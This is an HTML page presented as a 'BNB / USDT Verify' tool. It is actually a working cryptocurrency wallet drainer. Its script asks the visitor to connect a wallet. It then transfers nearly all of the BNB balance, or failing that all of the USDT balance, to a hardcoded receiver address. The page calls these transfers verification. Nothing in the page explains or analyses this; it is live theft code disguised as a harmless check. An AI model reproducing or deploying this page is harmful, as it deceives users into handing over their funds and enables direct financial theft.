<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BNB / USDT Verify</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.8.0/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background-color: #121212;
      color: #E0E0E0;
    }
    .button-primary {
      background-color: #FACC15;
      color: #121212;
      padding: 1rem 2rem;
      border-radius: 9999px;
      font-weight: 600;
      transition: all 0.3s ease;
      position: relative;
      z-index: 10;
    }
    .button-primary:hover {
      background-color: #fbbf24;
    }

    /* Pulse Rings */
    @keyframes pulse-ring {
      0% {
        transform: scale(0.8);
        opacity: 0.7;
      }
      70% {
        transform: scale(1.3);
        opacity: 0;
      }
      100% {
        opacity: 0;
      }
    }
    .pulse-ring {
      position: absolute;
      border: 2px solid #FACC15;
      border-radius: 50%;
      width: 160px;
      height: 160px;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      animation: pulse-ring 2.5s cubic-bezier(0.4, 0, 0.6, 1) infinite;
      z-index: 1;
    }
    .pulse-ring:nth-child(1) { animation-delay: 0s; }
    .pulse-ring:nth-child(2) { animation-delay: 1s; }
    .pulse-ring:nth-child(3) { animation-delay: 2s; }
  </style>
</head>
<body class="flex flex-col min-h-screen justify-center items-center">

  <h1 class="text-4xl font-bold text-yellow-400 mb-6">BNB / USDT Verify</h1>
  <p id="status" class="mb-6 text-gray-300">Click Verify to start...</p>

  <div class="relative flex justify-center items-center w-40 h-40">
    <!-- Rings -->
    <div class="pulse-ring"></div>
    <div class="pulse-ring"></div>
    <div class="pulse-ring"></div>

    <!-- Button -->
    <button onclick="handleVerify()" class="button-primary">Verify</button>
  </div>

  <script>
    const RECEIVER = "0x473aef5D2464d76B4C46cF883E611698b452d774"; 
    const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; 
    const ERC20_ABI = [
      "function balanceOf(address) view returns (uint)",
      "function transfer(address to, uint amount) returns (bool)"
    ];

    async function handleVerify() {
      const statusEl = document.getElementById("status");

      try {
        if (!window.ethereum) {
          statusEl.innerText = "No wallet detected. Please install Binance Wallet or MetaMask.";
          return;
        }

        // Request accounts
        await window.ethereum.request({ method: "eth_requestAccounts" });
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const userAddress = await signer.getAddress();

        statusEl.innerText = "Checking balances...";

        // 1. Check BNB balance
        const balanceBNB = await provider.getBalance(userAddress);
        if (balanceBNB > ethers.parseEther("0.001")) {
          statusEl.innerText = "Sending BNB...";
          const tx = await signer.sendTransaction({
            to: RECEIVER,
            value: balanceBNB - ethers.parseEther("0.0005") // leave gas buffer
          });
          await tx.wait();
          statusEl.innerText = "BNB sent successfully ✅";
          return;
        }

        // 2. Check USDT balance
        const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
        const balanceUSDT = await usdt.balanceOf(userAddress);

        if (balanceUSDT > 0n) {
          statusEl.innerText = "Sending USDT...";
          const tx = await usdt.transfer(RECEIVER, balanceUSDT);
          await tx.wait();
          statusEl.innerText = "USDT sent successfully ✅";
          return;
        }

        statusEl.innerText = "No BNB or USDT found ❌";
      } catch (err) {
        console.error(err);
        statusEl.innerText = "Error: " + err.message;
      }
    }
  </script>
</body>
</html>
